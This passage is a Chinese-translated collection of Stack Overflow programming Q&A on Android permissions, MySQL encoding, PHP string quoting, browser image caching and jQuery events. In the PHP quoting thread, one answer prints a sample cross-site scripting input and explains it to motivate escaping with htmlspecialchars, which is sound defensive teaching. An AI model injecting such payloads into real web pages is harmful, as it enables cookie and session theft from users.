我们如何才能重用 ssl 会话至少 30 秒？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-25T01:03:43.603

如果使用 Httpclient，您可以在 Desktop 平台上试用。

1，在PC上用Httpclient写一段Java代码，
2，用浏览器试试。

如果显示相同的结果，SSL 会话会在 5 秒内中断，这可能是服务器端的一些问题。
如果不是，那可能是客户端有问题。

祝你好运。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-25T10:48:01.437

我不知道您是否已经解决了这个问题，但是重用会话的一种非常模糊的解决方案是获取会话 ID，并将会话 ID 与要在 WebView 中打开的 URL 一起发送。

例如：`http://your.required.url/your.context/your.action;jsessionid=<the_current_session_id>?GET=PARAMETERS`

# java - 致命例外：主要-我不知道出了什么问题

> ID：11271470
> 
> 赞同：1
> 
> 时间：2012-06-30T04:45:05.193
> 
> 标签：java, android, eclipse, android-manifest, android-activity

我对 Eclipse 还是很陌生，我已经尝试了一切来防止这些错误发生：

```
06-30 00:38:28.773: E/AndroidRuntime(20520): FATAL EXCEPTION: main
06-30 00:38:28.773: E/AndroidRuntime(20520): java.lang.SecurityException: Permission       Denial: starting Intent { act=android.intent.action.CALL dat=tel:xxxxxxxxxx   cmp=com.android.phone/.OutgoingCallBroadcaster } from ProcessRecord{4157fb20   20520:com.mshaw.avanos/10174} (pid=20520, uid=10174) requires android.permission.CALL_PHONE
06-30 00:38:28.773: E/AndroidRuntime(20520):    at android.os.Parcel.readException(Parcel.java:1332)
06-30 00:38:28.773: E/AndroidRuntime(20520):    at android.os.Parcel.readException(Parcel.java:1286)
06-30 00:38:28.773: E/AndroidRuntime(20520):    at android.app.ActivityManagerProxy.startActivity(ActivityManagerNative.java:1691)
06-30 00:38:28.773: E/AndroidRuntime(20520):    at android.app.Instrumentation.execStartActivity(Instrumentation.java:1505)
06-30 00:38:28.773: E/AndroidRuntime(20520):    at android.app.Activity.startActivityForResult(Activity.java:3244)
06-30 00:38:28.773: E/AndroidRuntime(20520):    at android.app.Activity.startActivity(Activity.java:3351)
06-30 00:38:28.773: E/AndroidRuntime(20520):    at com.mshaw.avanos.AvanosActivity.onClick(AvanosActivity.java:34)
06-30 00:38:28.773: E/AndroidRuntime(20520):    at android.view.View.performClick(View.java:3549)
06-30 00:38:28.773: E/AndroidRuntime(20520):    at android.view.View$PerformClick.run(View.java:14400)
06-30 00:38:28.773: E/AndroidRuntime(20520):    at android.os.Handler.handleCallback(Handler.java:605)
06-30 00:38:28.773: E/AndroidRuntime(20520):    at android.os.Handler.dispatchMessage(Handler.java:92)
06-30 00:38:28.773: E/AndroidRuntime(20520):    at android.os.Looper.loop(Looper.java:154)
06-30 00:38:28.773: E/AndroidRuntime(20520):    at android.app.ActivityThread.main(ActivityThread.java:4894)
06-30 00:38:28.773: E/AndroidRuntime(20520):    at java.lang.reflect.Method.invokeNative(Native Method)
06-30 00:38:28.773: E/AndroidRuntime(20520):    at java.lang.reflect.Method.invoke(Method.java:511)
06-30 00:38:28.773: E/AndroidRuntime(20520):    at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:784)
06-30 00:38:28.773: E/AndroidRuntime(20520):    at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:551)
06-30 00:38:28.773: E/AndroidRuntime(20520):    at dalvik.system.NativeStart.main(Native Method) 
```

第一个错误让我很感兴趣，因为我已经提供了许可。这是我的清单：

```
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
package="com.mshaw.avanos"
android:versionCode="1"
android:versionName="1.0" >

<uses-permission android:name="android.permission.PHONE_CALL"  />
<uses-sdk android:minSdkVersion="15" />

<application
    android:icon="@drawable/avanos_logo"
    android:label="@string/app_name" 
    android:theme="@android:style/Theme.NoTitleBar">
    <activity
        android:name=".AvanosActivity"
        android:label="@string/app_name" 
        android:exported="true">
        <intent-filter>
            <action android:name="android.intent.action.MAIN" />L
            <category android:name="android.intent.category.LAUNCHER" />
        </intent-filter>

    </activity>
    <activity 
        android:name=".Password" 
        android:label="@string/settings">
    </activity>
</application> 
```

这是导致整个混乱的主要活动的一部分：

```
/** Called when the activity is first created. */

private Button button1;
private EditText editText1;
@Override
public void onCreate(Bundle savedInstanceState) {

    super.onCreate(savedInstanceState);
    setContentView(R.layout.main);

    button1 = (Button)findViewById(R.id.button1);
    setEditText1((EditText)findViewById(R.id.editText1));
    button1.setOnClickListener(this); {}}

            public void onClick(View arg0) {

                EditText num=(EditText)findViewById(R.id.editText1);
                String number = "tel:" +num.getText().toString().trim();
                Intent callIntent = new Intent(Intent.ACTION_CALL, Uri.parse(number));
                startActivity(callIntent);
            } 
```

有任何想法吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-30T04:53:04.443

没有类似的权限

`<uses-permission android:name="android.permission.PHONE_CALL" />`

**将其替换**为

`<uses-permission android:name="android.permission.CALL_PHONE" />`

这是供您参考的列表：[Manifest.permission](http://developer.android.com/reference/android/Manifest.permission.html)

# powershell - Windows 在创建文件之前获取文件的短路径

> ID：11271473
> 
> 赞同：2
> 
> 时间：2012-06-30T04:45:52.953
> 
> 标签：powershell, window, cmd

我试图在创建文件之前获取文件的短路径。如果文件夹或文件存在，我找到了一个可以将路径转换为短路径的示例。但是，有没有办法在文件存在之前获得短路径？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-04T07:37:29.707

感谢所有的评论。我认为解决这个问题的最简单方法是：

```
if file DOES NOT existed:
  generate shortPath
  return shortPath
else:
  touch a new file with exact name expected.
  generate shortPath
  remove temp file
  return shortPath 
```

# php - 将 utf8 字符导入 MYSQL

> ID：11271474
> 
> 赞同：1
> 
> 时间：2012-06-30T04:46:06.967
> 
> 标签：php, mysql, csv

我正在尝试将 CSV 导入 MYSQL 数据库。我的 CSV 包含 utf8 字符，例如 â 当我将这些字符导入我的数据库时，它们被替换为 ? 分数。

我尝试了以下方法：

a）直接通过 PHPMYADMIN 导入 b）通过 Navicat 导入（导入为 UTF8） c）使用 open office / mac excel 2010 将编码更改为 UTF8（似乎也使它们成为问号） d）另存为 CSV ms-dos（不是确定它是否会有所作为）

谁能阐明我可能做错了什么？这与我的排序规则有关吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-30T04:53:12.370

需要检查的几件事：

1) 确保表和/或行的排序规则是 utf8_general_ci（不区分大小写）或 utf8_bin（精确二进制）。还有很多其他的，但根据我的经验，这两个中的一个是最常见的。

2) 确保您的 php 代码文件编码为 UTF-8，没有字节顺序标记 (BOM)。这可以防止 PHP 在代码中丢失编码。

3) 如果您在 php 中使用多字节函数，请确保您在 php.ini 中设置了 default_charset = "utf-8"

4) 确保您的数据库连接（可能是 phpmyadmin 中的一个设置，不确定因为我不使用它）正在调用 mysql_set_charset('utf8', $connection); 在您打开连接之后和发送查询之前。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-30T04:49:16.690

是的，这与您的整理有关。您需要将其更改为 utf8_* 排序规则。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-07-08T06:55:29.040

在 import 语句中声明字符集对我有用：

```
mysql> LOAD DATA INFILE '/usr/share/mysql/file.csv' 
       INTO TABLE Table1
       CHARACTER SET utf8; 
```

# c# - 将 Dll 合并到程序集或嵌入资源中 - 哪个更好？

> ID：11271476
> 
> 赞同：3
> 
> 时间：2012-06-30T04:46:18.277
> 
> 标签：c#, .net, winforms, dll, ilmerge

我应该使用将引用的 Dll 合并到程序集中`ILMerge`还是将 Dll 嵌入到主程序集的资源中并在运行时加载。

这在性能方面会更好。在这两种情况下，最终可执行文件都将在运行时被压缩和解包。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-30T05:22:35.697

就个人而言，我不会将 dll 嵌入程序集中。这会创建一个可执行程序集，如果不重新编译就很难使用它并且体积庞大。最好在本地引用 dll，这样可以加快程序速度。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-30T05:25:52.840

这是.NET。无论如何，“可执行文件”仍然只是字节码，并且在运行时 JIT 之后，实际的本机代码隐藏在一个临时文件夹中。我怀疑你会从这两种提议的方法中的任何一种中获得任何明显的区别。

当您想对应用程序进行更改时，分发单独的 DLL 非常好，因为您只是替换组件，而不是整个程序集。

# javascript - Javascript Regex 指定允许的内容（而不是不允许的内容）

> ID：11271477
> 
> 赞同：4
> 
> 时间：2012-06-30T04:46:24.890
> 
> 标签：javascript, regex, jslint

我一直在使用这个：

`str2 = str1.replace(/[^\w]/gi, '');`

它工作得很好，但与 JSLint 相冲突，因为[这里](https://stackoverflow.com/questions/2372635/purpose-of-jslint-disallow-insecure-in-regex-option?rq=1)和[这里](https://stackoverflow.com/questions/4109214/jslint-insecure-in-regular-expression)`insecure '^'`的帖子中有概述。

共识是最好使用您`regex`指定允许的内容而*不是*不允许的内容。然而，没有人演示过如何做到这一点。我什至把弗拉纳根和克罗克福德摆在我面前，但令我感到羞耻的是，我仍然不知道该怎么做。

那么......你如何设置`str2`只允许使用正面测试而不是负面测试`\w`中发现的字符？`str1`

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-30T04:54:13.383

尝试使用`\W`（大写 W）。

`\w`选择单词，而选择`\W`非*单词*。并且在表情上看起来更好一些。

这是一个[RegEx 备忘](http://www.cheatography.com/davechild/cheat-sheets/regular-expressions/)单，它在您编码时会派上用场！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-30T04:51:48.600

您的示例太简单了，无法证明不在`^`正则表达式中使用的意义。

一个更好的例子可以是：在表单提交中清理 HTML 代码，您希望允许 HTML 标记，但不希望人们注入 XSS（跨站点脚本）攻击。在这种情况下，如果您使用黑名单方法，则无法可靠地删除所有攻击代码，因为攻击者可以更改语法以避免您的过滤器 - 或调整代码以便过滤后的代码将返回攻击代码。正确的方法是使用白名单并列出所有允许的标签，以及允许的属性。这个例子可能与正则表达式无关——因为不应该使用正则表达式来解析 HTML，但它展示了过滤中白名单与黑名单方法的要点。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-30T05:05:19.123

这取决于你想做什么。

`\w`当字符串包含 \w 字符集中的字符以外的字符时，您可以只允许该字符集并引发错误，方法是执行以下操作：

```
str1='blah blah string';
if(str1.match(/^\w*$/gi)
{
    //do something
}
else
{
    //alert and/or throw error
} 
```

或者您可以接受定义为 str1 的任何内容并过滤掉您不想要的字符。这就是你目前正在做的事情。例子：

```
str1='blah blah some string';
str1=str1.replace(/\W/gi,''); 
```

注意：以上是您正在做的事情的较短版本。`str2 = str1.replace(/[^\w]/gi, '');`

# html - 当同一图像的多个实例嵌入到 HTML 中时，是否会加载一次图像？

> ID：11271484
> 
> 赞同：41
> 
> 时间：2012-06-30T04:47:32.537
> 
> 标签：html, browser

如果我在一个页面中多次使用同一个图像，每个图像会单独加载，占用带宽和流量，还是只会加载一个，其余嵌入代码将重用图像？

例如，假设我这样做了：

```
<img src="http://img.to/image.jpg"/>
<img src="http://img.to/image.jpg"/>
<img src="http://img.to/image.jpg"/>
<img src="http://img.to/image.jpg"/>
<img src="http://img.to/image.jpg"/>
<img src="http://img.to/image.jpg"/>
...
<img src="http://img.to/image.jpg"/>
<img src="http://img.to/image.jpg"/> 
```

并且`image.jpg`是100kb。当浏览器加载这个页面时，会浪费掉（100Kb * # of img tags）的流量吗？还是只加载一个`image.jpg`并将其重用于其余标签？

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2017-01-13T13:51:26.583

实现[第 5 版 HTML 规范的](https://www.w3.org/TR/html5/embedded-content-0.html#the-img-element)浏览器可以重用图像，而不管缓存相关的 HTTP 标头如何。可能只会发生单个网络请求。

规范定义了图像键。

> 7.2 让 key 是一个元组，由生成的绝对 URL、img 元素的 crossorigin 属性的模式组成，如果该模式不是 No CORS，则为 Document 对象的来源。

当浏览器下载第一个图像源时，它会使用键将其添加到可用图像列表中。

> 如果下载成功并且用户代理能够确定图像的宽度和高度
> 
> 1.  将 img 元素设置为完全可用状态。
> 2.  使用 key 键将图像添加到可用图像列表中。

当浏览器看到另一个具有相同键的图像时，它将从可用图像列表中获取它。

> 7.3 如果可用图像列表包含键条目，则将 img 元素设置为完全可用状态，适当更新图像的呈现，排队一个任务以在 img 元素上触发一个名为 load 的简单事件，然后中止这些脚步。

尽管如此，浏览器可能会随时从可用图像列表中删除图像。

> 每个 Document 对象都必须有一个可用图像列表。此列表中的每个图像都由一个元组标识，该元组包含一个绝对 URL、一个 CORS 设置属性模式，如果模式不是无 CORS，则还有一个原点。用户代理可以随时将一个 Document 对象的可用图像列表中的条目复制到另一个（例如，当创建 Document 时，用户代理可以将其他 Document 中加载的所有图像添加到其中），但不得更改这样做时以这种方式复制的条目。用户代理也可以随时从这些列表中删除图像（例如，为了节省内存）。

有关更多信息，请参阅[在解析具有多个具有相同 src 的 img 节点的文档时如何使用可用图像列表？](https://github.com/whatwg/html/issues/2465)GitHub 上的 HTML 标准存储库中的问题。

* * *

## 回答 #2

> 赞同：18
> 
> 时间：2012-07-01T18:40:36.507

试试看——在研究缓存问题时，像 Firebug for Firefox 或 Chrome 中的开发者工具这样的工具非常有用。如果您在其中打开“网络”面板并重新加载页面，您将看到为每个项目发送的 HTTP 状态代码。304（未修改）表示该项目是从缓存中本地检索的。

正如**dthorpe**上面所说，缓存标头在这里很重要。除了确保没有设置“无缓存”之外，如果您有权访问您的服务器配置，您应该积极主动——如果您知道资源不会改变，您应该确保设置任何一个'Expires' 标头（告诉浏览器缓存副本应被视为陈旧的日期）或 'Cache-Control: max-age' 标头（给出天数/小时数而不是设定日期）。

您也可以为不同的 mime 类型/文件夹设置不同的时间尺度，这允许您获取客户端数据以经常刷新 HTML 内容，但很少刷新图像和样式表。

这是 Google 的精彩[介绍视频/文章](https://developers.google.com/speed/articles/caching)，值得一看。

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2012-06-30T04:57:06.050

它可能取决于特定的浏览器实现，但我希望对图像的第一次引用会命中服务器，随后对同一图像 URL 的引用将从浏览器缓存中提供。因此，对图像只有一个网络请求。

也就是说，*如果*服务器在图像响应上设置的 HTTP 缓存标头完全允许浏览器缓存图像。如果缓存标头设置为“no-cache”之类的内容，则浏览器需要为每个引用重新获取图像。您可以使用 Fiddler 等网络数据包嗅探器检查图像响应上的 HTTP 标头。

如果浏览器直到图像完全下载后才在浏览器缓存中填充图像 URL，那么您可能会看到对同一图像的多个请求，但这似乎不太可能。

# php - 从php追加数据后按钮单击事件不起作用

> ID：11271486
> 
> 赞同：0
> 
> 时间：2012-06-30T04:48:04.040
> 
> 标签：php, jquery, html, events, click

我正在使用 $.get() 将带有 javascript 的 html 从 php 加载到 div 到 div。按钮单击事件工作正常。然后再次将相同的东西再次添加到具有不同 id 的不同 div 中，但它不起作用。谁能帮助我。我的代码是这个

```
<style>
    .loadWindow {
        width:333px;
        height: 202px;
        padding: 5px 5px 0 5px;
        font: 12px Arial, Helvetica, sans-serif;
        border:double;
    }

    #loadWindow {
        display:none;
    } 
```

```
<div id="main-box">
<div class="loadWindow" id="loadWindow"></div><button id="make">make</button> 
```

我的javascript代码如下

```
$(function(){
    $('#make').click(function(){
        var id = $('.loadWindow').length;
        var aw = $('#loadWindow').clone().attr("id", "window"+id);

        //load data from php
        $.get("mydata.php", function(data) {
            aw.html(data);  
            $('#main-box').append(aw);
            aw.show();
        }, 'json');
    });
}); 
```

`

我的 mydata.php 代码如下

```
echo '<div><button id="closeBtn">Close</button></div><script>$("#closeBtn").click(function(){alert("Close button Clicked!");});</script>'; 
```

我希望每个窗口分别（单独）单击事件并显示警报。在此代码中，单击事件无法根据窗口工作。我能做些什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-30T04:50:16.400

**工作演示** [http://jsfiddle.net/QYEWs/13/](http://jsfiddle.net/QYEWs/13/)

请使用`.on`API 将一个或多个事件的事件处理函数附加到所选元素。

接口：[http ://api.jquery.com/on/](http://api.jquery.com/on/)

**请注意：**您的附加将使 DOM 无效，因为您的 id 将始终相同，使其成为一个类

在 DOM 中动态添加的 html 上附加点击事件

这应该有帮助，`:)`

像这样

附加单击事件以关闭按钮，如下所示：

```
$("#main-box").on("click",".closeBtn", function() {
    alert("Close button Clicked!");
});​

$(function(){
    $('#make').on('click', function(){
        var id = $('.loadWindow').length;
        var aw = $('#loadWindow').clone().attr("id", "window"+id);

        //load data from php
        $.get("mydata.php", function(data) {
            aw.html(data);  
            $('#main-box').append(aw);
            aw.show();
        }, 'json');
    });
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-30T14:23:09.627

```
$(function(){
    $('#make').click(function(){
        var id = $('.loadWindow').length;
        var aw = $('#loadWindow').clone(true).attr("id", "window"+id);
        //load data from php
        $.get("mydata.php", function(data) {
            aw.html(data);  
            $('#main-box').append(aw);
            aw.show();
        }, 'json');
    });
}); 
```

# php - History.js 与 Ajax 服务器响应

> ID：11271495
> 
> 赞同：2
> 
> 时间：2012-06-30T04:49:21.347
> 
> 标签：php, ajax, history.js

我在使用 history.js 时遇到了一点问题。

我尝试使用 history.js + ajax 和 dojotoolkit 来实现类似 github 的源浏览器。

它有效，但我在服务器端遇到了一个小问题

我使用php，当某个页面加载history.js pushState时，服务器会首先检查请求类型，“它是ajax吗？”。如果是ajax，那么服务器将只返回页面的请求部分，如果不是，服务器将返回整页。

问题是，如果我关闭浏览器，然后重新打开它，页面将只显示服务器返回的 ajax 页面，而不是完整页面，因为它仍然被称为 ajax 请求。

我怎么解决这个问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-16T18:03:30.073

我遇到了完全相同的问题，并花了一些时间研究它。结果是，当您从历史记录中恢复选项卡或从其他页面返回页面时，原始页面通常会从浏览器缓存中恢复（最初我认为它向服务器发出完全相同的请求，包括标题）。

如果您对 URL 的最后一次请求是 AJAX 并且状态已被推送，那么 AJAX 响应将被缓存在浏览器中 - 稍后会向您显示缓存的响应。

解决方案是通过发送正确的标头来禁用 AJAX 请求的缓存。这是我在 PHP 中使用的，以确保没有浏览器会缓存我的响应：

```
header("Expires: Sun, 19 Nov 1978 05:00:00 GMT");
header("Cache-Control: no-store, no-cache, must-revalidate");
header("Pragma: no-cache"); 
```

# eclipse - 无法使用 Eclipse 插件重新安装 Google Web Toolkit

> ID：11271498
> 
> 赞同：0
> 
> 时间：2012-06-30T04:49:44.940
> 
> 标签：eclipse, gwt, eclipse-plugin

几周前，我为 Eclipse 3.7 安装并更新了 Google 插件。它安装了 GWT 以及其他东西。我能够编译一个谷歌应用程序。我今天在 Eclipse 上做了几件事，现在 GWT 不见了。我看首选项-->谷歌-->网络工具包；列表为空。我运行了插件更新，它一直说 GWT 已经安装并拒绝更新/重新安装。我明确卸载 GWT 并运行插件更新；它毫无怨言地更新。但是Preference-->Google-->Web Toolkit；列表仍然是空的！

如何强制插件在 Preference-->Google-->Web Toolkit 中填充 SDK 信息？实际上有一个“添加”按钮来配置 SDK。但是我不知道GWT的安装目录。Eclipse 插件在哪里保存 GWT？

似乎 Eclipse 在两个不同的地方跟踪 GWT SDK 的安装？我的 GWT SDK 数据库似乎已损坏，Eclipse 插件似乎依赖于自己的私有数据库来了解 GWT SDK 的安装状态？

有人可以帮忙吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-01T21:32:31.023

我认为您所指的不是插件，而是 SDK。下载 SDK 解压缩，然后添加首选项->Google->Web Toolkit。下载 SDK 的链接是：[http ://code.google.com/p/google-web-toolkit/](http://code.google.com/p/google-web-toolkit/)

# php - 在 echo 语句中混合 html 和 php 变量

> ID：11271501
> 
> 赞同：5
> 
> 时间：2012-06-30T04:50:01.387
> 
> 标签：php, html

这可能是我在一个语句中使用单引号和双引号时遇到的问题。但我有这段代码：

```
echo '<form>
      <input type="submit" value="$number" onClick="function();">
      </form>' 
```

这样做的问题是提交按钮说的是短语`$number`而不是该变量的值。

所以我环顾四周，找到了这个解决方案：

```
echo "<form>
      <input type='submit' value='$number' onClick='function();'>
      </form> 
```

这会正确输出 $number 的值，但我习惯于在我的 echo 语句周围使用单引号并希望保持这种方式。为什么只是将所有单引号转换为双引号，并将双引号转换为单引号即可解决问题？是否对第一段代码进行了修改，允许我在 echo 上保留单引号，在属性上保留双引号？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-06-30T05:00:32.940

在 PHP 中，双引号字符串会自动解析其中包含的任何变量，但单引号字符串不会。所以：

```
$myVar = 21;
echo "myVar: $myVar" 
```

这将输出文本：`myVar: 21`

然而：

```
$myVar = 21;
echo 'myVar: $myVar' 
```

这将输出文本：`myVar: $myVar`

您的代码的一个问题是，在 HTML 中，元素属性的值必须用双引号括起来，而不是单引号。我知道有些浏览器会接受这种形式（甚至根本不接受引号），但这不是正确的方法。

有多种方法可以正确地实现您的愿望。

方法一：转义双引号字符串：

```
$myVar = 21;
echo "<div id=\"$myVar\"></div>"; 
```

虽然这可能是一个相当不雅的解决方案，但它会起作用。

方法二：对单引号（或双引号）字符串使用字符串连接：

```
$myVar = 21;
echo '<div id="' . $myVar . '"></div>'; 
```

这提供了一个更好的 IMO 解决方案，因为如果您愿意，您可以在其中使用函数调用或任何其他 PHP 代码。

**警告：**

请注意，当您不确定`$myVar`（即用户输入）的内容时，将其直接放入 HTML 代码是跨站脚本 (XSS) 形式的安全漏洞。想象一下用户输入如下内容：

```
lol"><script>alert('XSS!');</script></div><div id="lol2 
```

这将导致生成的 HTML 代码包含以下内容：

```
<div id="lol"><script>alert('XSS!');</script></div><div id="lol2"></div> 
```

这只是一个良性示例，但攻击者可以轻松使用相同的技术窃取用户的 cookie（假装以该用户身份登录）。这里的信息是，当您不能 100% 确定变量的内容时，不要将其直接插入 HTML 代码。相反，调用`htmlspecialchars($myVar)`. 这将转化为以下内容：

```
$myVar = $_POST['whatever'];
echo '<div id="' . htmlspecialchars($myVar) . '"></div>'; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-30T04:53:31.370

在 PHP 中，双引号中的变量被处理和评估，而在单引号中，所有内容都被视为字符串的一部分。

这里有一个更好的解释： [http ://www.trans4mind.com/personal_development/phpTutorial/quotes.htm](http://www.trans4mind.com/personal_development/phpTutorial/quotes.htm)

来自上述链接的双引号示例：

```
$something="Oh something";
echo "My answer is $something.<br>";
//result is: My answer is Oh something 
```

来自上述链接的单引号示例：

```
echo 'My answer is $something.<br>';
//result is: My answer is $something. 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-30T04:55:35.897

当你使用单引号时，里面的所有内容都是按字面意思理解的，除了单引号。使用双引号时，任何以美元符号 ($) 开头的内容都被 PHP 假定为变量。使用变量时，我通常喜欢用双引号开始回显。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-06-30T04:56:27.830

如果要继续使用单引号，则需要使用附加运算符（句点）。

```
echo '<form>
      <input type="submit" value="' . $number . '" onClick="function();">
      </form>'; 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2014-11-01T04:43:25.543

你可以这样做，避免整个歌舞。我认为它更容易阅读。

```
<form>
    <input type="submit" value="<?php echo $number; ?>" onClick="myFunction()">
</form> 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2018-04-12T19:17:36.667

这对我来说输出相同

```
 echo '<link rel="apple-touch-icon-precomposed" sizes="57x57" href='. ${base_url_favicon} . '/apple-touch-icon-57x57.png />'."\n";
echo "<link rel='apple-touch-icon-precomposed' sizes='57x57' href='${base_url_favicon}/apple-touch-icon-57x57.png' />\n"; 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-06-30T04:58:57.597

PHP 对双引号字符串执行所谓的变量插值，这意味着搜索字符串以查找它们可能包含的任何变量，其值在字符串中被替换。如果要保留单引号，则需要将字符串和变量连接在一起，如下所示：

```
echo '<form>
<input type="submit" value="' . $number . '" onClick="function();">
</form>'; 
```

或者，如果要保留双引号，可以转义要打印的双引号：

```
echo "<form>
<input type=\"submit\" value=\"$number\" onClick=\"function();\">
</form>" 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2012-06-30T04:58:19.487

PHP 将单引号和双引号字符串区分为不同的事物。单引号字符串是文字，您希望它们按原样输出。双引号字符串将被解释（扫描）任何 PHP 变量并进行适当的替换。

这只是该语言的一个特性（也是一个有用的特性）。我实际上建议您习惯在所有语言的字符串中使用双引号。没有一种语言是不可接受的，在静态类型语言（C、C++、Java...）中，单引号表示一个字符，而双引号表示一个字符串。也就是说，`String foo = 'my string';`Java 中的错误与`char * foo = 'my string';`C 或 C++ 中的错误相同。但是，`char foo = 'a';`是有效的，原样`String foo = "my string";`

只有当您需要从 PHP 中获得最后几纳秒的性能时，您才能将双引号字符串转换为单引号字符串。在其他语言中，这无关紧要。Afaik，PHP 是唯一一种使这个字符串特定于双引号和单引号区别的语言。

# php - 在 MySQL 数据库中存储路径/层次结构的最佳方法是什么？

> ID：11271508
> 
> 赞同：2
> 
> 时间：2012-06-30T04:51:11.940
> 
> 标签：php, mysql, database, structure, hierarchy

我有一个文章档案，每个文章都属于不同的类别和子类别。将其结构化并存储在数据库中的最佳方法是什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-30T04:54:42.690

请参阅 Bill Karwin 关于在 MySQL 数据库中存储分层数据的各种方法的幻灯片。

*   [层次数据模型](http://www.slideshare.net/billkarwin/models-for-hierarchical-data)

他介绍的四种方法是：

*   邻接表
*   路径枚举
*   嵌套集
*   封闭表

不同的方法使执行某些常见操作变得更容易或更难，例如更新数据或查找整个子树。看一下比较不同方法的幻灯片 69。

# xcode - 如何增加图像的大小？

> ID：11271511
> 
> 赞同：0
> 
> 时间：2012-06-30T04:52:07.137
> 
> 标签：xcode, macos, cocoa

我正在尝试在 NSImageView 中显示图像。但是，当我将一个对象放入我的窗口（通过界面生成器）时，单元格中的图像显得非常小。如何增加尺寸？

我不是在谈论增加单元格的大小 - 我是在谈论增加单元格中图像的大小。我知道增加单元格的大小会增加我的图像的大小，但是现在单元格中的很多空间都是空白的。我想让我的图像在单元格中占据更多空间。

注意我在 OSX Snow Leopard 上，我正在开发一个桌面应用程序，而不是 iOS 应用程序。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-30T05:00:23.220

神圣的 API 文档，蝙蝠侠！请参阅[`-[NSImageView setImageScaling:]`](https://developer.apple.com/library/mac/documentation/Cocoa/Reference/ApplicationKit/Classes/NSImageView_Class/Reference/Reference.html#//apple_ref/occ/instm/NSImageView/setImageScaling:)或 Interface Builder 中的缩放控件。

![IB 中的缩放控制](../Images/4ef955a68c9164ed5901f05d5b12ad76.png)

# php - 当我运行此页面时，我在 firebug 中看到错误

> ID：11271512
> 
> 赞同：0
> 
> 时间：2012-06-30T04:52:18.243
> 
> 标签：php, codeigniter

我遇到了火灾错误 $("project").autocomplete 不起作用。

```
<script> 
    $(document).ready(function () {    
        $(function() {        
            $.ajax({
                dataType: 'json',
                async: false,
                url : "<?php base_url() ?>stud_data",
                success: function(data) {
                    projects = data.value;                
                }  

            });
            $( '#project' ).autocomplete({
                minLength: 1,
                source: projects,
                focus: function( event, ui ) {
                    $( '#project' ).val( ui.item.label );
                    return false;
                },
                select: function( event, ui ) {
                    $( '#project' ).val( ui.item.label );
                    $( '#project-id' ).val( ui.item.value );
                    $( '#project-description' ).html( ui.item.desc );
                    $( '#project-icon' ).attr( "src", ui.item.icon );           
                    return false;
                }
            })
            .data( "autocomplete" )._renderItem = function( ul, item ) {
                return $( "<li></li>" )
                .data( "item.autocomplete", item )
                .append( "<a> <b>" + item.label +"</b>" + item.photo +"<br>" + item.desc + "</a>" )
                .appendTo( ul );
            };
        });
    });
 </script> 
```

**编辑：**

```
<script src="<? base_url() ?>/js/jqueryui/jquery-1.7.2.js" type="text/javascript"></script>

<link rel="stylesheet" href="<? base_url() ?>/js/jqueryui/themes/base/jquery.ui.autocomplete.css"> 
<link rel="stylesheet" href="<? base_url() ?>/js/jqueryui/themes/base/jquery.ui.base.css">
<link rel="stylesheet" href="<? base_url() ?>/js/jqueryui/themes/base/jquery.ui.theme.css">

<script src="<? base_url() ?>/js/jqueryui/ui/jquery.ui.core.js" type="text/javascript"></script>
<script src="<? base_url() ?>/js/jqueryui/ui/jquery.ui.widget.js" type="text/javascript"></script>
<script src="<? base_url() ?>/js/jqueryui/ui/jquery.ui.position.js" type="text/javascript"></script>
<script src="<? base_url() ?>/js/jqueryui/ui/jquery.ui.autocomplete.js" type="text/javascript"></script>
<script type="text/javascript" src="/ckeditor/ckeditor.js"></script>
<script type="text/javascript" src="/ckeditor/source/core/ckeditor.js"></script>
<script type="text/javascript" src="<? base_url() ?>/js/jquery_fancybox/fancybox/jquery.fancybox-1.3.4.pack.js"></script>
<link rel="stylesheet" type="text/css" href="<? base_url() ?>/js/jquery_fancybox/fancybox/jquery.fancybox-1.3.4.css" media="screen" /> 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-30T05:20:08.353

打开 Firbug 并启用**NET**并查看所有 js 并确保没有文件状态为**404**

第二调试您的 Ajax 请求，如果不只是修改代码

```
<? base_url() ?> to <?=base_url() ?> 
```

您的 Ajax 代码中的相同内容

```
$.ajax({
   //Your code
   url : "<?php echo base_url() ?>stud_data",
}) 
```

从您的代码中删除`$(function() { })`，因为您已经使用`$(document).read(function(){ })`两者正在做同样的事情

希望有帮助

# entity-framework - .Net 4.5 安装不正确？

> ID：11271519
> 
> 赞同：2
> 
> 时间：2012-06-30T04:53:37.057
> 
> 标签：entity-framework, .net-4.5, entity-framework-5

我刚刚下载并安装了 .net 4.5，它成功通过了安装程序，我收到了所有成功的安装消息，重新启动了我的机器，但什么也没有。

